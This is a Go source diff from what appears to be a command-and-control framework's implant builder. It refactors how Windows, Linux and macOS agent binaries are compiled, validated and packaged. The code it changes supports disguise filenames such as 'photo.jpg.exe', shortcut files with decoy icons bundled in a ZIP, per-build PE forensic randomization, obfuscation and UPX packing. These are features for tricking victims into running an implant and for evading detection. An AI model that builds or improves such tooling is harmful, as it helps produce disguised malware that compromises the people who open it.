@@ -14,10 +14,7 @@ import (
 func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 	dataDir := filepath.Dir(outputDir)
 	profile := NormalizeImplantConfig(&cfg, dataDir)
-	if err := win7CompatConflict(&cfg); err != nil {
-		return "", err
-	}
-	if err := slimTransportConflict(&cfg); err != nil {
+	if err := ValidateImplantBuild("windows", "exe", &cfg); err != nil {
 		return "", err
 	}
 	plan, err := resolveAgentPlan(&cfg)
@@ -38,22 +35,21 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 			outputDir = abs
 		}
 	}
+	goCmd := getGoCmd()
+	if goCmd == "" {
+		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
+	}
 
 	// Write agent source files from embed (supports agent.go + platform-specific agent_*.go)
 	if err := extractAgentSources(payloadFS, tmpDir, plan); err != nil {
 		return "", err
 	}
 
-	// go.mod with required external dependencies
-	goMod := buildGoMod("windows", false, plan.TransportsExcluded, cfg.Win7Compat, plan.includes("webrtc"))
-
-	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
+	// Reuse the repository module graph when available; this avoids a network
+	// dependent `go mod tidy` for every build and keeps agent dependencies
+	// aligned with the server's pinned versions.
+	if err := prepareAgentModule(goCmd, tmpDir, "windows", false, plan, cfg.Win7Compat); err != nil {
 		return "", err
-	}
-	if cfg.Win7Compat {
-		if err := materializeWin7Shim(tmpDir); err != nil {
-			return "", err
-		}
 	}
 
 	ldflags, blob, sKey := buildLdflags(cfg, profile, "windows")
@@ -68,66 +64,57 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 	// Output filename — honor disguise: photo.jpg.exe / doc.pdf.exe / ...
 	outName := cfg.Filename
 	if outName == "" {
-		outName = "forgec2_agent.exe"
+		// Empty form values are legal; never let two concurrent builds share a
+		// default output path.
+		outName = uniqueBuildName("forgec2_agent", ".exe")
 	}
 	// Disguise filename via the shared helper (single source of truth).
 	outName = ApplyDisguiseFilename(outName, cfg.DisguiseAs)
 	// Strip any directory components so a user-supplied filename containing
 	// ".." or an absolute path cannot write outside outputDir (A1).
 	outName = safeBuildFileName(outName)
-	outPath := filepath.Join(outputDir, outName)
-	if !filepath.IsAbs(outPath) {
-		if abs, err := filepath.Abs(outPath); err == nil {
-			outPath = abs
-		}
-	}
-	// ensure the dir for outPath exists (use abs dir)
-	outDir := filepath.Dir(outPath)
-	if err := os.MkdirAll(outDir, 0750); err != nil {
+	outPath, buildPath, err := prepareBuildOutput(outputDir, outName)
+	if err != nil {
 		return "", err
 	}
+	defer os.Remove(buildPath)
 
-	// Run go mod tidy to resolve dependencies
-	goCmd := getGoCmd()
-	if goCmd == "" {
-		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
-	}
-	if err := runGoModTidy(goCmd, tmpDir, cfg.Win7Compat); err != nil {
-		return "", err
-	}
-
-	// Build command - use explicit GOOS/GOARCH
 	goarch, err := resolveBuildArch("windows", cfg.Architecture)
 	if err != nil {
 		return "", err
 	}
-	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", goarch, blob, sKey, cfg.Win7Compat); err != nil {
+	if err := buildAgentBinary(goCmd, tmpDir, ldflags, buildPath, cfg.Obfuscate, "windows", goarch, blob, sKey, cfg.Win7Compat); err != nil {
 		return "", err
 	}
 
 	// Post-build: full per-build PE forensic randomization (must run before
 	// self-check patch so the hash covers final bytes).
-	finalizePE(outPath, cfg, goarch)
+	if err := finalizePE(buildPath, cfg, goarch); err != nil {
+		return "", err
+	}
 
 	// Optional UPX compression (also before the self-check patch).
-	if err := maybeCompressUPX(outPath, cfg, "exe"); err != nil {
+	if err := maybeCompressUPX(buildPath, cfg, "exe"); err != nil {
 		return "", err
 	}
 
 	// Self-integrity: embed the SHA-256 of the finalized binary (must run after
 	// stripping so the hash matches what the agent reads at runtime).
 	if cfg.SelfCheck {
-		if err := patchSelfCheckHash(outPath); err != nil {
+		if err := patchSelfCheckHash(buildPath); err != nil {
 			return "", err
 		}
 	}
 
 	// Fail loudly (rather than deliver a corrupt binary) if the produced exe is
 	// malformed or the wrong architecture.
-	if err := validatePE(outPath, windowsMachine(goarch)); err != nil {
+	if err := validatePE(buildPath, windowsMachine(goarch)); err != nil {
 		return "", fmt.Errorf("generated exe failed PE validation: %w", err)
 	}
 
+	if err := commitBuildOutput(buildPath, outPath, 0755); err != nil {
+		return "", err
+	}
 	if _, err := os.Stat(outPath); err != nil {
 		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
 	}
@@ -137,55 +124,60 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 		lnkName := strings.TrimSuffix(exeName, ".exe")
 		lnkName = strings.TrimSuffix(lnkName, ".EXE") + ".lnk"
 		lnkPath := filepath.Join(outputDir, lnkName)
-		if data, err := BuildLnkForExeWithIcon(exeName, DisguiseLnkIcon(cfg.DisguiseAs, exeName)); err == nil {
-			if err := os.WriteFile(lnkPath, data, 0644); err != nil {
-				fmt.Printf("lnk warning: failed to write %s: %v\n", lnkPath, err)
-				return outPath, nil
-			}
-			// Create ZIP containing EXE + LNK for convenient single download
-			zipName := strings.TrimSuffix(exeName, ".exe")
-			zipName = strings.TrimSuffix(zipName, ".EXE") + ".zip"
-			zipPath := filepath.Join(outputDir, zipName)
-			zf, err := os.Create(zipPath)
-			if err != nil {
-				fmt.Printf("lnk warning: failed to create %s: %v\n", zipPath, err)
-				return outPath, nil
-			}
-			zw := zip.NewWriter(zf)
-			for _, p := range []string{outPath, lnkPath} {
-				b, err := os.ReadFile(p)
-				if err != nil {
-					fmt.Printf("lnk warning: failed to read %s: %v\n", p, err)
-					_ = zw.Close()
-					_ = zf.Close()
-					return outPath, nil
-				}
-				w, err := zw.Create(filepath.Base(p))
-				if err != nil {
-					fmt.Printf("lnk warning: zip entry failed for %s: %v\n", p, err)
-					_ = zw.Close()
-					_ = zf.Close()
-					return outPath, nil
-				}
-				if _, err := w.Write(b); err != nil {
-					fmt.Printf("lnk warning: zip write failed for %s: %v\n", p, err)
-					_ = zw.Close()
-					_ = zf.Close()
-					return outPath, nil
-				}
-			}
-			if err := zw.Close(); err != nil {
-				fmt.Printf("lnk warning: zip close failed: %v\n", err)
-				_ = zf.Close()
-				return outPath, nil
-			}
-			if err := zf.Close(); err != nil {
-				fmt.Printf("lnk warning: file close failed for %s: %v\n", zipPath, err)
-				return outPath, nil
-			}
-			// Prefer returning ZIP when LNK is requested so BuildDownload serves both
-			return zipPath, nil
+		// A requested LNK delivery must not silently degrade to a bare EXE:
+		// the operator (and the download UI) expects a single .zip bundle, so
+		// every bundling failure is reported and its partial files removed.
+		lnkData, err := BuildLnkForExeWithIcon(exeName, DisguiseLnkIcon(cfg.DisguiseAs, exeName))
+		if err != nil {
+			return "", fmt.Errorf("lnk bundle: create shortcut: %w", err)
 		}
+		if err := os.WriteFile(lnkPath, lnkData, 0644); err != nil {
+			return "", fmt.Errorf("lnk bundle: write shortcut: %w", err)
+		}
+		zipName := strings.TrimSuffix(exeName, ".exe")
+		zipName = strings.TrimSuffix(zipName, ".EXE") + ".zip"
+		zipPath := filepath.Join(outputDir, zipName)
+		zf, err := os.Create(zipPath)
+		if err != nil {
+			_ = os.Remove(lnkPath)
+			return "", fmt.Errorf("lnk bundle: create zip: %w", err)
+		}
+		// cleanupFail removes the partially written zip and the loose LNK so a
+		// failed bundle cannot leave build material behind.
+		cleanupFail := func(err error) (string, error) {
+			_ = zf.Close()
+			_ = os.Remove(zipPath)
+			_ = os.Remove(lnkPath)
+			return "", fmt.Errorf("lnk bundle: %w", err)
+		}
+		zw := zip.NewWriter(zf)
+		for _, p := range []string{outPath, lnkPath} {
+			b, err := os.ReadFile(p)
+			if err != nil {
+				return cleanupFail(fmt.Errorf("read %s: %w", p, err))
+			}
+			w, err := zw.Create(filepath.Base(p))
+			if err != nil {
+				return cleanupFail(fmt.Errorf("zip entry %s: %w", p, err))
+			}
+			if _, err := w.Write(b); err != nil {
+				return cleanupFail(fmt.Errorf("zip write %s: %w", p, err))
+			}
+		}
+		if err := zw.Close(); err != nil {
+			return cleanupFail(fmt.Errorf("zip close: %w", err))
+		}
+		if err := zf.Close(); err != nil {
+			_ = os.Remove(zipPath)
+			_ = os.Remove(lnkPath)
+			return "", fmt.Errorf("lnk bundle: file close: %w", err)
+		}
+		// The ZIP is the single downloadable artifact. Remove the loose
+		// EXE/LNK so build-job cleanup does not leave orphans behind.
+		_ = os.Remove(outPath)
+		_ = os.Remove(lnkPath)
+		// Prefer returning ZIP when LNK is requested so BuildDownload serves both
+		return zipPath, nil
 	}
 
 	return outPath, nil
@@ -240,10 +232,7 @@ func GeneratePowerShell(cfg ImplantConfig, outputDir string) (string, error) {
 func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
 	dataDir := filepath.Dir(outputDir)
 	profile := NormalizeImplantConfig(&cfg, dataDir)
-	if err := win7CompatConflict(&cfg); err != nil {
-		return "", err
-	}
-	if err := slimTransportConflict(&cfg); err != nil {
+	if err := ValidateImplantBuild("linux", "elf", &cfg); err != nil {
 		return "", err
 	}
 	plan, err := resolveAgentPlan(&cfg)
@@ -265,71 +254,66 @@ func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
 			outputDir = abs
 		}
 	}
+	goCmd := getGoCmd()
+	if goCmd == "" {
+		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
+	}
 
 	if err := extractAgentSources(payloadFS, tmpDir, plan); err != nil {
 		return "", err
 	}
 
-	goMod := buildGoMod("linux", false, plan.TransportsExcluded, cfg.Win7Compat, plan.includes("webrtc"))
-	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
+	if err := prepareAgentModule(goCmd, tmpDir, "linux", false, plan, cfg.Win7Compat); err != nil {
 		return "", err
-	}
-	if cfg.Win7Compat {
-		if err := materializeWin7Shim(tmpDir); err != nil {
-			return "", err
-		}
 	}
 
 	ldflags, blob, sKey := buildLdflags(cfg, profile, "linux")
 
 	outName := cfg.Filename
 	if outName == "" {
-		outName = "forgec2_agent"
+		outName = uniqueBuildName("forgec2_agent", "")
 	}
 	// Linux binaries typically have no .exe
 	if strings.HasSuffix(strings.ToLower(outName), ".exe") {
 		outName = outName[:len(outName)-4]
 	}
 	outName = safeBuildFileName(outName)
-	outPath := filepath.Join(outputDir, outName)
-	if !filepath.IsAbs(outPath) {
-		if abs, err := filepath.Abs(outPath); err == nil {
-			outPath = abs
-		}
-	}
-	outDir := filepath.Dir(outPath)
-	if err := os.MkdirAll(outDir, 0750); err != nil {
+	outPath, buildPath, err := prepareBuildOutput(outputDir, outName)
+	if err != nil {
 		return "", err
 	}
+	defer os.Remove(buildPath)
 
-	goCmd := getGoCmd()
-	if goCmd == "" {
-		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
-	}
-	if err := runGoModTidy(goCmd, tmpDir, cfg.Win7Compat); err != nil {
-		return "", err
-	}
 	goarch, err := resolveBuildArch("linux", cfg.Architecture)
 	if err != nil {
 		return "", err
 	}
-	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "linux", goarch, blob, sKey, cfg.Win7Compat); err != nil {
+	if err := buildAgentBinary(goCmd, tmpDir, ldflags, buildPath, cfg.Obfuscate, "linux", goarch, blob, sKey, cfg.Win7Compat); err != nil {
 		return "", err
 	}
 
 	// Optional UPX compression (before the self-check patch below).
-	if err := maybeCompressUPX(outPath, cfg, "elf"); err != nil {
+	if err := maybeCompressUPX(buildPath, cfg, "elf"); err != nil {
 		return "", err
 	}
 
-	if _, err := os.Stat(outPath); err != nil {
-		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
-	}
-
 	if cfg.SelfCheck {
-		if err := patchSelfCheckHash(outPath); err != nil {
+		if err := patchSelfCheckHash(buildPath); err != nil {
 			return "", err
 		}
+	}
+
+	// Validate the final bytes (after UPX/self-check mutation) and reject a
+	// wrong-architecture or malformed ELF before publishing it.
+	if err := validateELF(buildPath, goarch); err != nil {
+		return "", fmt.Errorf("generated elf failed ELF validation: %w", err)
+	}
+
+	if err := commitBuildOutput(buildPath, outPath, 0755); err != nil {
+		return "", err
+	}
+	if _, err := os.Stat(outPath); err != nil {
+		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
 	}
 
 	return outPath, nil
@@ -339,10 +323,7 @@ func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
 func GenerateMacOS(cfg ImplantConfig, outputDir string) (string, error) {
 	dataDir := filepath.Dir(outputDir)
 	profile := NormalizeImplantConfig(&cfg, dataDir)
-	if err := win7CompatConflict(&cfg); err != nil {
-		return "", err
-	}
-	if err := slimTransportConflict(&cfg); err != nil {
+	if err := ValidateImplantBuild("darwin", "macho", &cfg); err != nil {
 		return "", err
 	}
 	plan, err := resolveAgentPlan(&cfg)
@@ -364,62 +345,54 @@ func GenerateMacOS(cfg ImplantConfig, outputDir string) (string, error) {
 			outputDir = abs
 		}
 	}
+	goCmd := getGoCmd()
+	if goCmd == "" {
+		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
+	}
 
 	if err := extractAgentSources(payloadFS, tmpDir, plan); err != nil {
 		return "", err
 	}
 
-	goMod := buildGoMod("darwin", false, plan.TransportsExcluded, cfg.Win7Compat, plan.includes("webrtc"))
-	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
+	if err := prepareAgentModule(goCmd, tmpDir, "darwin", false, plan, cfg.Win7Compat); err != nil {
 		return "", err
-	}
-	if cfg.Win7Compat {
-		if err := materializeWin7Shim(tmpDir); err != nil {
-			return "", err
-		}
 	}
 
 	ldflags, blob, sKey := buildLdflags(cfg, profile, "darwin")
 
 	outName := cfg.Filename
 	if outName == "" {
-		outName = "forgec2_agent"
+		outName = uniqueBuildName("forgec2_agent", "")
 	}
 	outName = safeBuildFileName(outName)
-	outPath := filepath.Join(outputDir, outName)
-	if !filepath.IsAbs(outPath) {
-		if abs, err := filepath.Abs(outPath); err == nil {
-			outPath = abs
-		}
-	}
-	outDir := filepath.Dir(outPath)
-	if err := os.MkdirAll(outDir, 0750); err != nil {
+	outPath, buildPath, err := prepareBuildOutput(outputDir, outName)
+	if err != nil {
 		return "", err
 	}
+	defer os.Remove(buildPath)
 
-	goCmd := getGoCmd()
-	if goCmd == "" {
-		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
-	}
-	if err := runGoModTidy(goCmd, tmpDir, cfg.Win7Compat); err != nil {
-		return "", err
-	}
 	goarch, err := resolveBuildArch("darwin", cfg.Architecture)
 	if err != nil {
 		return "", err
 	}
-	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "darwin", goarch, blob, sKey, cfg.Win7Compat); err != nil {
+	if err := buildAgentBinary(goCmd, tmpDir, ldflags, buildPath, cfg.Obfuscate, "darwin", goarch, blob, sKey, cfg.Win7Compat); err != nil {
 		return "", err
 	}
 
-	if _, err := os.Stat(outPath); err != nil {
-		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
-	}
-
 	if cfg.SelfCheck {
-		if err := patchSelfCheckHash(outPath); err != nil {
+		if err := patchSelfCheckHash(buildPath); err != nil {
 			return "", err
 		}
+	}
+	if err := validateMachO(buildPath, goarch); err != nil {
+		return "", fmt.Errorf("generated mach-o failed validation: %w", err)
+	}
+
+	if err := commitBuildOutput(buildPath, outPath, 0755); err != nil {
+		return "", err
+	}
+	if _, err := os.Stat(outPath); err != nil {
+		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
 	}
 
 	return outPath, nil
